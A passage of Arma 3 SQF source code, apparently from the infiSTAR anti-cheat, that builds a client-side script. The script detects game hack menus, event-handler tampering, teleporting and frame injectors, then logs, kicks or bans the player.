					"; }; _A3AHstring = _A3AHstring + "
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
						_shouldbe = _shouldbe + 1;
						_kdID = (findDisplay 46) displayAddEventHandler ['KeyDown','_this call EPOCH_KeyDown'];
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_CKB)then{ _A3AHstring = _A3AHstring + "
						_shouldbe = _shouldbe + 1;
						_kdID = (findDisplay 46) displayAddEventHandler ['KeyDown','false'];
					"; }; _A3AHstring = _A3AHstring + "
		uiSleep 0.2;
					"; if(_CKB)then{ _A3AHstring = _A3AHstring + "
						_randomid = round(random 5);
						for '_i' from 1 to _randomid do
						{
							_shouldbe = _shouldbe + 1;
							_kdID = (findDisplay 46) displayAddEventHandler ['KeyDown','false'];
						};
						if(_kdID != _shouldbe)then
						{
							if(alive player)then
							{
								if(_kbacaught)then
								{
									_log = format['KeyBinds added   %1 should be %2',_kdID,_shouldbe];
									[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
									(findDisplay 46)closeDisplay 0;
								};
								_kbacaught=true;
								"; if(_RUK)then{ _A3AHstring = _A3AHstring + "
									(findDisplay 46) displayRemoveAllEventHandlers 'KeyUp';
									(findDisplay 46) displayAddEventHandler ['KeyUp',"+_fnc_infiKeyHandler+"];
									"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
										(findDisplay 46) displayAddEventHandler ['KeyUp','_this call EPOCH_KeyUp'];
									"; }; _A3AHstring = _A3AHstring + "
								"; }; _A3AHstring = _A3AHstring + "
							};
						};
					"; }; _A3AHstring = _A3AHstring + "
				"; }else{ _A3AHstring = _A3AHstring + "
		uiSleep 0.2;
				"; }; _A3AHstring = _A3AHstring + "
				if(!isNull player)then
				{
					if(alive player)then
					{
						"; if(!_EHF && !_NO_EHF)then{ _A3AHstring = _A3AHstring + "
							player removeAllEventHandlers 'Fired';
							player addEventHandler ['Fired',{if(inSafeZone)then{deleteVehicle (_this select 6)}}];
							player addEventHandler ['Fired',compile ('_this call '+str(_FiredCheck))];
							player addEventHandler ['Fired',{_this call "+str _customFiredEventhandler+"}];
							"; if(_MOD == 'AltisLife')then{ _A3AHstring = _A3AHstring + "
								player addEventHandler ['Fired',{_this call life_fnc_onFired}];
							"; }; _A3AHstring = _A3AHstring + "
							"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
								player addEventHandler ['Fired',{_this call EPOCH_fnc_playerFired}];
							"; }; _A3AHstring = _A3AHstring + "
						"; }; _A3AHstring = _A3AHstring + "
						"; if(_MOD != 'Epoch')then{ _A3AHstring = _A3AHstring + "
							player removeAllEventHandlers 'Take';
						"; }; _A3AHstring = _A3AHstring + "
						"; if(_C3D)then{ _A3AHstring = _A3AHstring + "
							if(_addCaseMEHold > -1)then
							{
								_addCaseMEH = addMissionEventHandler ['Draw3D', {}];
								if(_addCaseMEHold + 1 != _addCaseMEH)then
								{
									_log = format['EH_Draw3D 2:   %1 should be %2',_addCaseMEH,_addCaseMEHold + 1];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							};
							removeAllMissionEventHandlers 'Draw3D';
							_roundRandomNumberMEH = (round(random 3))+1;
							_addCaseMEH = 0;
							for '_i' from 0 to _roundRandomNumberMEH do
							{
								_addCaseMEH = addMissionEventHandler ['Draw3D', {}];
							};
							if(_addCaseMEH == _roundRandomNumberMEH)then
							{
								_addCaseMEHold = _addCaseMEH;
							}
							else
							{
								_log = format['EH_Draw3D 1:   %1 should be %2',_addCaseMEH,_roundRandomNumberMEH];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						"; }; _A3AHstring = _A3AHstring + "
						
						
						"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
							player removeAllEventHandlers 'AnimChanged';
							player addEventHandler ['Damaged',{}];
							{
								player removeAllEventHandlers _x;
								_addCase = player addEventHandler [_x,{}];
								if(_addCase > 0)then{
									_log = format['EH_%1: %2',_x,_addCase];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							} forEach ['HandleHeal','Dammaged','Damaged','HitPart'];
							"; if(_RHD)then{ _A3AHstring = _A3AHstring + "
								if(_addCaseHDMGold > -1)then
								{
									_addCaseHDMG = player addEventHandler ['HandleDamage',{}];
									if((_addCaseHDMGold + 1 != _addCaseHDMG)&&(_addCaseHDMG != 0))then
									{
										_log = format['EH_HandleDamage 2:   %1 should be %2',_addCaseHDMG,_addCaseHDMGold + 1];
										[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									};
								};
								player removeAllEventHandlers 'HandleDamage';
								_roundRandomNumberHDMG = (round(random 3))+1;
								_addCaseHDMG = 0;
								for '_i' from 0 to _roundRandomNumberHDMG do
								{
									_addCaseHDMG = player addEventHandler ['HandleDamage',{}];
								};
								if(_addCaseHDMG == _roundRandomNumberHDMG)then
								{
									"; if(str _CHD != '{}')then{ _A3AHstring = _A3AHstring + "
										_addCaseHDMG = player addEventHandler ['HandleDamage',"+str _CHD+"];
									"; }; _A3AHstring = _A3AHstring + "
									_addCaseHDMGold = _addCaseHDMG;
								}
								else
								{
									_log = format['EH_HandleDamage 1:   %1 should be %2',_addCaseHDMG,_roundRandomNumberHDMG];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							"; }else{ _A3AHstring = _A3AHstring + "
							player removeAllEventHandlers 'HandleDamage';
							player addEventHandler ['HandleDamage',''];
							"; }; _A3AHstring = _A3AHstring + "
						"; }; _A3AHstring = _A3AHstring + "
						
						
						"; if(_MOD == 'AltisLife')then{ _A3AHstring = _A3AHstring + "
							"; if(_RRH)then{ _A3AHstring = _A3AHstring + "
								player removeAllEventHandlers 'Respawn';
								player addEventHandler ['Respawn', {_this call life_fnc_onPlayerRespawn}];
							"; }; _A3AHstring = _A3AHstring + "
							player removeAllEventhandlers 'InventoryClosed';
							player addEventHandler ['InventoryClosed', {_this call life_fnc_inventoryClosed}];
							"; if(_RIO)then{ _A3AHstring = _A3AHstring + "
								player removeAllEventhandlers 'InventoryOpened';
								player addEventHandler ['InventoryOpened', {_this call life_fnc_inventoryOpened}];
							"; }; _A3AHstring = _A3AHstring + "
							"; if(_RKH)then{ _A3AHstring = _A3AHstring + "
								player removeAllEventHandlers 'Killed';
								player addEventHandler ['Killed', {_this spawn life_fnc_onPlayerKilled}];
							"; }; _A3AHstring = _A3AHstring + "
							"; if(_RHD)then{ _A3AHstring = _A3AHstring + "
								player removeAllEventhandlers 'HandleDamage';
								player addEventHandler ['HandleDamage',{_this call life_fnc_HandleDamage;}];
							"; }; _A3AHstring = _A3AHstring + "
							player addEventHandler ['Take',{_this call life_fnc_onTakeItem}];
							if("+str _REH+")then{player removeAllEventhandlers 'Hit';};
							player removeAllEventHandlers 'Damaged';
							player removeAllEventHandlers 'Dammaged';
						"; }; _A3AHstring = _A3AHstring + "
					}
					else
					{
						_addCaseMEHold = -1;
						_addCaseHDMGold = -1;
					};
				}
				else
				{
					_addCaseMEHold = -1;
					_addCaseHDMGold = -1;
				};
			};
			_log = 'Loop #7 ended!';
			[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		[_name,_puid,_admins] spawn {
			_name = _this select 0;
			_puid = _this select 1;
			_admins = _this select 2;
			disableSerialization;
			uiSleep 5;
			BIS_fnc_showNotification_queue = [];
			
			_uistocheck = ['RscDisplayRemoteMissions','RscDisplayDebugPublic','RscDisplayMovieInterrupt'];
			"; if(_checkRscDisplayArsenal)then{ _A3AHstring = _A3AHstring + "
			_uistocheck pushBack 'RscDisplayArsenal';
			"; }; _A3AHstring = _A3AHstring + "
			{uiNamespace setVariable[_x,nil];} forEach _uistocheck;
			
			_inventoryIds = [8,0,18,70,46,12,602,999,-1200,-1300,-1400,-1500,-1900,-8,-9,-10,-15,63,55,49,-6,24,-13,129,174,38500,7300];
			_inventoryDisplays = ['No display'];
			{_inventoryDisplays pushBack format['Display #%1',_x];} forEach _inventoryIds;
			_found54 = false;
			_lastText = '';
			_toBreakDisplays = [];
			
			_badIDDsToKickPre = "+str _badIDDsToKick+";
			_badIDDsToKick = [];
			{_badIDDsToKick pushBack format['Display #%1',_x];} forEach _badIDDsToKickPre;
			_badIDDsToClosePre = "+str _badIDDsToClose+";
			_badIDDsToClose = [];
			{_badIDDsToClose pushBack format['Display #%1',_x];} forEach _badIDDsToClosePre;
			_wasclosed = false;
			"; if(_UDW)then{ _A3AHstring = _A3AHstring + "
			_allowedIddsPre = "+str _allowedIDDs+";
			_allowedIDDs = ['No display'];
			{_allowedIDDs pushBack format['Display #%1',_x];} forEach _allowedIddsPre;
			_announceDisplayIddOnce = [];
			"; }; _A3AHstring = _A3AHstring + "
			
			_verybadStrings = "+str _verybadStrings+";
			_checked = [];
			_lastEmpty = 0;
			while{1==1}do
			{
				if(!isNull ((findDisplay 73) displayCtrl 302))then
				{
					_log = 'MenuBasedHack :: 73 :: 302';
					[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				
				if(diag_tickTime - _lastEmpty > 45)then
				{
					_lastEmpty = diag_tickTime;
					_checked = [];
				};
				
				{
					if(!isNull (findDisplay _x))then
					{
						_log = format['MenuBasedHack_D%1',_x];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				} forEach [-1338,-1337,17,19,30,32,45,56,59,62,64,69,71,110,125,132,155,156,162,165,166,167,312,1320,1321,2727,2928,2929,3030,316000,9899,0110];
				
				{
					_control = _x;
					_ctrlTxt = ctrlText _control;
					_lowerctrlTxt = toLower _ctrlTxt;
					{
						if(_lowerctrlTxt find _x > -1)then
						{
							_log = format['BadCtrlText: %1 on %2 %3 - %4',_x,_display,_control,_ctrlTxt];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					} forEach _verybadStrings;
				} forEach [((findDisplay 49) displayCtrl 2),((findDisplay 49) displayCtrl 103)];
				if(!isNull ((findDisplay 46) displayCtrl -2))then
				{
					_log = 'MenuBasedHack :: 46 :: -2';
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				_uiNamespace_dynamicText = uiNamespace getVariable 'BIS_dynamicText';
				if(!isNil '_uiNamespace_dynamicText')then
				{
					_allCtrls = allControls _uiNamespace_dynamicText;
					_whiteListed = ['','Debug Mode Enabled'];
					{
						if(getPlayerUID _x != '')then
						{
							_whiteListed pushBack (name _x);
						};
					} forEach allPlayers;
					{
						_ctrl = _x;
						_txt = ctrlText _ctrl;
						if(_txt != _lastText)then
						{
							if!(_txt in _whiteListed)then
							{
								_lastText = _txt;
								_ltxt = toLower _txt;
								{
									if(_ltxt find _x != -1)then
									{
										_log = format['BadText on %1: %2 - %3',_ctrl,_x,_txt];
										[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
										(findDisplay 46)closeDisplay 0;
									};
								} forEach _verybadStrings;
							};
						};
					} forEach _allCtrls;
				};
				if(!isNull (findDisplay 157))then
				{
					_log = 'MenuBasedHack_D157   or player opened the menu which hidden in the escape menu, at the bottom right corner.';
					[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				{
					_cc1 = uiNamespace getVariable _x;
					if(!isNil '_cc1')then
					{
						_formatedcc1 = format['%1',_cc1];
						if(_formatedcc1 != '<null>')then
						{
							if(_formatedcc1 != 'No display')then
							{
								_log = format['Hacked: %1 - %2',_x,_cc1];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							}
							else
							{
								uiNamespace setVariable[_x,nil];
								_log = format['Hacked: %1 - %2',_x,_cc1];
								[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
								(findDisplay 46)closeDisplay 0;
							};
						};
					};
				} forEach _uistocheck;
				"; if(_UNC)then{ _A3AHstring = _A3AHstring + "
				if!(_puid in _admins)then
				{
					if(!isNil 'BIS_fnc_showNotification_queue')then
					{
						if!(BIS_fnc_showNotification_queue isEqualTo [])then
						{
							_log = format['Hacked: showNotification - %1',BIS_fnc_showNotification_queue];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
				};
				"; }; _A3AHstring = _A3AHstring + "
				if(!isNull (findDisplay 148))then
				{
					if((lbSize 104)-1 > 3)exitWith{
						_log = 'Hacked: RscDisplayConfigureControllers';
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				};
				{
					_lbSize = lbSize _x;
					if(_lbSize > 0)then{
						_log = format['lbSize %1 == %2',_x,_lbSize];
						[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
						lbClear _x;
					};
				} forEach [101,102];
				if(!_found54)then
				{
					_display = findDisplay 54;
					if(!isNull _display)then
					{
						{
							if(_x && !isNull _display)then
							{
								if(_found54)exitWith{};
								[] spawn {
									disableSerialization;
									while{1==1}do
									{
										waitUntil {!isNull findDisplay 54};
										_display = findDisplay 54;
										_txt = _display displayCtrl 1001;
										_txt ctrlSetText format['%1',localize 'STR_A3_RscDisplayInsertMarker_Title'];
										_txt ctrlCommit 0;
										_btn1 = _display displayCtrl 1;
										_btn1 buttonSetAction '';
										_btn1 ctrlCommit 0;
										_btn2 = _display displayCtrl 2;
										_btn2 buttonSetAction '';
										_btn2 ctrlCommit 0;
									};
								};
								_found54 = true;
							};
						} forEach [
							(toLower ctrlText (_display displayCtrl 1001) != toLower localize 'STR_A3_RscDisplayInsertMarker_Title'),
							{if(buttonAction (_display displayCtrl _x) != '')exitWith{true}; false} forEach [1,2]
						];
					};
				};
				_dsp163 = findDisplay 163;
				if(!isNull _dsp163)then
				{
					(_dsp163 displayCtrl 101) ctrlRemoveAllEventHandlers 'LBDblClick';
					(_dsp163 displayCtrl 101) ctrlRemoveAllEventHandlers 'LBSelChanged';
					if((toLower ctrlText (_dsp163 displayCtrl 1000) != toLower localize 'STR_DISP_OPTIONS_SCHEME') || (buttonAction (_dsp163 displayCtrl 1) != '') || (buttonAction (_dsp163 displayCtrl 2) != ''))then
					{
						_log = 'Hacked: RscDisplayControlSchemes';
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				};
				_RscDisplayConfigureAction = uiNamespace getVariable 'RscDisplayConfigureAction';
				if(!isNil '_RscDisplayConfigureAction')then
				{
					_formatedRscDisplayConfigureAction = format['%1',_RscDisplayConfigureAction];
					if(_formatedRscDisplayConfigureAction != '<null>')then
					{
						if(_formatedRscDisplayConfigureAction != 'No display')then
						{
							_title = ctrlText 1000;
							if(_title != localize '$STR_A3_RscDisplayConfigureAction_Title')exitWith{
								_log = 'Hacked: RscDisplayConfigureAction';
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
							{
								if(buttonAction _x != '')exitWith{
									_log = 'Hacked: RscDisplayConfigureAction';
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							} forEach [1,107,104,106,109,105,108];
						};
					};
				};
				"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					if(isNil'startingFncOpenHTML')then
					{
						if(buttonAction -13 != '')then
						{
							_log = format['ButtonAction Changed: %1',buttonAction -13];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
						if(buttonAction -14 != '')then
						{
							_log = format['ButtonAction Changed: %1',buttonAction -14];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
				"; }; _A3AHstring = _A3AHstring + "
				if(_wasclosed)then
				{
					closeDialog 0;closeDialog 0;closeDialog 0;
					_wasclosed = false;
				};
				
				{
					if(!isNull _x)then
					{
						_display = _x;
						_strx = str _x;
						if(_strx in _badIDDsToKick)then
						{
							_log = format['BadDisplayID: %1',_strx];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						}
						else
						{
							if(_strx in _badIDDsToClose)then
							{
								systemChat format['<infiSTAR.de> %1 has been closed.',_strx];
								_x closeDisplay 0;
								closeDialog 0;closeDialog 0;closeDialog 0;
								_wasclosed = true;
							}
							else
							{
								"; if(_UDW)then{ _A3AHstring = _A3AHstring + "
								if!(_strx in _allowedIDDs)then
								{
									_x closeDisplay 0;
									closeDialog 0;closeDialog 0;closeDialog 0;
									
									if(_strx in _announceDisplayIddOnce)exitWith{};
									_announceDisplayIddOnce pushBack _strx;
									
									_log = format['Not Allowed Displays: %1   (was it legit? add the number to _allowedIDDs in your infiSTAR_config.sqf!)',_strx];
									[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
								};
								"; }; _A3AHstring = _A3AHstring + "
							};
						};
						if(!isNull _display)then
						{
							{
								if(!isNull (_display displayCtrl _x))then
								{
									_log = format['MenuBasedHack :: %1 :: %2',_display,_x];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							} forEach [24010,16030,13163,989187,16100];
							
							{
								_control = _x;
								_checkifIn = format['%1%2',_display,_control];
								if!(_checkifIn in _checked)then
								{
									_checked pushBack _checkifIn;
									_controltype = ctrlType _control;
									if(_controltype isEqualTo 5)then
									{
										_size = lbSize _control;
										if(_size > 0)then
										{
											for '_i' from 0 to (_size-1) do
											{
												_lbtxt = _control lbText _i;
												_lowerlbtxt = toLower _lbtxt;
												{
													if(_lowerlbtxt find _x > -1)then
													{
														_log = format['BadlbText: %1 FOUND [%2] ON %3 %4',_lbtxt,_x,_display,_control];
														[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
													};
												} forEach _verybadStrings;
											};
										};
									}
									else
									{
										if(_controltype isEqualTo 12)then
										{
											_curTV = tvCurSel _control;
											_tvtxt = _control tvText _curTV;
											_lowertvtxt = toLower _tvtxt;
											{
												if(_lowertvtxt find _x > -1)then
												{
													_log = format['BadtvText: %1 FOUND [%2] ON %3 %4',_tvtxt,_x,_display,_control];
													[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
													[] spawn "+_AHKickOFF+";
												};
											} forEach _verybadStrings;
										}
										else
										{
											if!(_controltype in [3,4,8,9,15,42,81,101,102])then
											{
												_ctrlTxt = ctrlText _control;
												_lowerctrlTxt = toLower _ctrlTxt;
												{
													if(_lowerctrlTxt find _x > -1)then
													{
														_log = format['BadCtrlText: %1 FOUND [%2] ON %3 %4',_ctrlTxt,_x,_display,_control];
														[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
														[] spawn "+_AHKickOFF+";
													};
												} forEach _verybadStrings;
											};
										};
									};
								};
							} forEach (allControls _display);
						};
					};
				} forEach allDisplays;
				uiSleep 0.5;
			};
			_log = 'Loop #8 ended!';
			[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		"; if((_EHF && !_NO_EHF) || _CAP)then{ _A3AHstring = _A3AHstring + "
		[_name,_puid] spawn {
			_name = _this select 0;
			_puid = _this select 1;
			uiSleep 10;
			_caughtFired = 0;
			_randomIDcount = 0;
			_object = player;
			_acnt = -1;
			while{1==1}do
			{
				_tmpObj = player;
				"; if(_EHF && !_NO_EHF)then{ _A3AHstring = _A3AHstring + "
					if((!isNull player) && (alive player))then
					{
						player removeAllEventHandlers 'Fired';
						_id = player addEventHandler ['Fired',{if(inSafeZone)then{deleteVehicle (_this select 6)}}];
						_id = player addEventHandler ['Fired',{_this call "+_FiredCheck+"}];
						_id = player addEventHandler ['Fired',{_this call "+str _customFiredEventhandler+"}];
						"; if(_MOD == 'AltisLife')then{ _A3AHstring = _A3AHstring + "
							_id = player addEventHandler ['Fired',{_this call life_fnc_onFired}];
						"; }; _A3AHstring = _A3AHstring + "
						"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
							_id = player addEventHandler ['Fired',{_this call EPOCH_fnc_playerFired}];
						"; }; _A3AHstring = _A3AHstring + "
						_randomIDcount = round(random 3);
						for '_i' from 1 to _randomIDcount do
						{
							_id = player addEventHandler ['Fired',{}];
						};
					};
				"; }; _A3AHstring = _A3AHstring + "
				uiSleep 2;
				if((!isNull player) && (alive player))then
				{
					if(player isEqualTo _tmpObj)then
					{
						"; if(_EHF && !_NO_EHF)then{ _A3AHstring = _A3AHstring + "
							_id = player addEventHandler ['Fired',{}];
							_maxid = (4+_randomIDcount);
							if(_id != _maxid)then
							{
								_caughtFired = _caughtFired + 1;
								if(_caughtFired > 2)then
								{
									if(_id == _maxid+1)then
									{
										_log = format['EH_FIRED: %1 (KICKED TO LOBBY) might be EpochCode interfering',_id];
										[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
										(findDisplay 46)closeDisplay 0;
									}
									else
									{
										_log = format['EH_FIRED: %1',_id];
										[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									};
								};
							};
						"; }; _A3AHstring = _A3AHstring + "
						"; if(_CAP)then{ _A3AHstring = _A3AHstring + "
							if(player isEqualTo _object)then[{_acnt = _acnt + 1},{_object = player;_acnt = 0}];
							_actionid = player addAction ['', '', [], -5, false, true, '', 'false'];player removeAction _actionid;
							if(_actionid > _acnt + 1)then
							{
								removeAllActions player;removeAllActions (vehicle player);
								_log = format['Actions: %1/%2 possible scroll menu hack (or you added custom actions..)',_actionid,_acnt];
								[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
								_acnt = _actionid;
							};
						"; }; _A3AHstring = _A3AHstring + "
					};
				};
			};
			_log = 'Loop #10 ended!';
			[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		"; }; _A3AHstring = _A3AHstring + "







"; if(_UAT)then{ _A3AHstring = _A3AHstring + "
	[_name,_puid] spawn {
		_name = _this select 0;
		_puid = _this select 1;
		_FNC_ANTI_TP = {
			private['_name','_puid','_myRespawnPosition','_lastpos','_lastHeightATL','_log','_lasttime','_difftime','_curpos','_tmpAHpos','_driver','_tpcount'];
			_name = _this select 0;
			_puid = _this select 1;
			"+_AHpos+" = [];
			_lastpos = getPosATL player;
			_lastHeightATL = _lastpos select 2;
			_lasttime = diag_tickTime;
			
			_myRespawnPosition = getPosATL player;
			_tpcount = 0;
			while{1==1}do
			{
				_curpos = getPosATL player;
				_curHeightATL = _curpos select 2;
				_distance = _lastpos distance2D _curpos;
				_mindistcheck = if((vehicle player) isEqualTo player)then{3}else{10};
				if(_distance > _mindistcheck)then
				{
					_difftime = diag_tickTime - _lasttime;
					_speed = _distance / _difftime;
					_type = typeOf (vehicle player);
					_topSpeed = (getNumber(configFile >> 'CfgVehicles' >> _type >> 'maxSpeed')) max 5;
					if(_speed < _topSpeed)exitWith{};
					
					if(_lastpos distance2D _myRespawnPosition > 50)then
					{
						_driver = driver(vehicle player);
						if((isNull _driver)||{(player isEqualTo _driver)})then
						{
							if(!isNil '"+_AHpos+"')then
							{
								_tmpAHpos = "+_AHpos+";
								"+_AHpos+" = [];
								if(typeName _tmpAHpos != 'ARRAY')then
								{
									_log = format['Admin Teleport Variable highjacked! Type now: %1 - %2',typeName _tmpAHpos,_tmpAHpos];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
									player SetVelocity [0,0,1];player setPosATL _lastpos;
								};
								if(_tmpAHpos isEqualTo [])then
								{
									if(((backpack player) isEqualTo 'B_Parachute')&&(_curHeightATL > 10))exitWith{};
									_tpcount = _tpcount + 1;
									_log = format['POTENTIAL-TP-REVERTED: Moved %1m in %2s (from %3 to %4). TopSpeed of %5 is %6 speed was %7. Player FPS: %8.',round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speed,diag_fps];
									if(_tpcount > 3)then
									{
										[_name,_puid,'TMPBAN',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									}
									else
									{
										[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
									};
									player SetVelocity [0,0,1];player setPosATL _lastpos;
								}
								else
								{
									_log = 'Teleported by Admin';
									[_name,_puid,'TPLOG',toArray(_log),_tmpAHpos select 0,_tmpAHpos select 1,_lastpos,_curpos] call "+_AH1311KICKLOG+";
								};
							}
							else
							{
								_log = 'TELEPORT CHECK VARIABLE NILLED!';
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
								player SetVelocity [0,0,1];player setPosATL _lastpos;
							};
						}
						else
						{
							if(isNull _driver)exitWith{};
							if!(getPlayerUID _driver isEqualTo '')exitWith{};
							
							_log = format['TP with AI as driver..  Moved %1m in %2s (from %3 to %4). TopSpeed of %5 is %6 speed was %7. Player FPS: %8.',round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speed,diag_fps];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
				};
				if(vehicle player isEqualto player)then
				{
					if(((backpack player) isEqualTo 'B_Parachute')&&(_curHeightATL > 10))exitWith{};
					
					_velZ = (velocity player) select 2;
					if(((_curHeightATL - _lastHeightATL) > 30)&&(_velZ < -5))then
					{
						systemChat format['Height changed by %1.. setting you to ground.',(_curHeightATL - _lastHeightATL)];
						player SetVelocity [0,0,1];player setPosATL _lastpos;
					};
				};
				
				_lastpos = getPosATL player;
				_lastHeightATL = _lastpos select 2;
				_lasttime = diag_tickTime;
				uiSleep 0.5;
			};
			_log = 'Loop #3 ended!';
			[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		while {true} do
		{
			waitUntil {uiSleep 1;(!isNull player)&&{alive player}&&{!((typeOf player) isEqualTo 'VirtualMan_EPOCH')}};
			_ANTI_TP_THEAD_STARTED = [_name,_puid] spawn _FNC_ANTI_TP;
			
			waitUntil {(isNull player)||{!alive player}||{((typeOf player) isEqualTo 'VirtualMan_EPOCH')}};
			terminate _ANTI_TP_THEAD_STARTED;
			uiSleep 1;
		};
	};
"; }; _A3AHstring = _A3AHstring + "







		[_name,_puid] spawn {
			_name = _this select 0;
			_puid = _this select 1;
			diag_log format['LOCALPLAYERINFO: %1(%2) | %3(%4) | %5',_name,_puid,str _name,str _puid,str (getPlayerUID player)];
			PVAH_AdminReq = nil;
			if(!isNil 'PVAH_AdminReq')then
			{
				_log = format['BadVar#ADMIN: PVAH_AdminReq - %1',PVAH_AdminReq];
				[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
			"; if(_REF)then{ _A3AHstring = _A3AHstring + "
				"+_oneachframe+"=time;
			"; }; _A3AHstring = _A3AHstring + "
			while{1==1}do
			{
				_randomnombre = round(random 9999);
				PVAH_AdminReq = _randomnombre;
				if(str PVAH_AdminReq != str _randomnombre)then
				{
					_log = 'BadVar#ADMIN: PVAH_AdminReq';
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				"; if(_REF)then{ _A3AHstring = _A3AHstring + "
				if(typeName "+_oneachframe+" != 'SCALAR')then
				{
					_log = format['onEachFrame injector detected: %1 - %2 (type of check value changed!)',typeName "+_oneachframe+","+_oneachframe+"];
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				_maxtime = 30;
				if(diag_fps < 20)then{_maxtime = 60;};
				if(time - "+_oneachframe+" > _maxtime)then
				{
					_log = format['onEachFrame injector detected: %1 - FPS: %2 (KICKED)',time - "+_oneachframe+",diag_fps];
					[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				onEachFrame {
					"+_oneachframe+"=time;
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					call EPOCH_onEachFrame;
					"; }; _A3AHstring = _A3AHstring + "
					"; if((str _rOEF != '{}')&&(typeName _rOEF == 'CODE'))then{ _A3AHstring = _A3AHstring + "
					call "+str _rOEF+";
					"; }; _A3AHstring = _A3AHstring + "
				};
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_OAP && !_CAP)then{ _A3AHstring = _A3AHstring + "
					removeAllActions player;removeAllActions (vehicle player);
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_RAD)then{ _A3AHstring = _A3AHstring + "
					player allowDamage true;
					(vehicle player) allowDamage true;
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_URC)then{ _A3AHstring = _A3AHstring + "
				_unit = player;
				if((!isNull _unit)&&{alive _unit})then
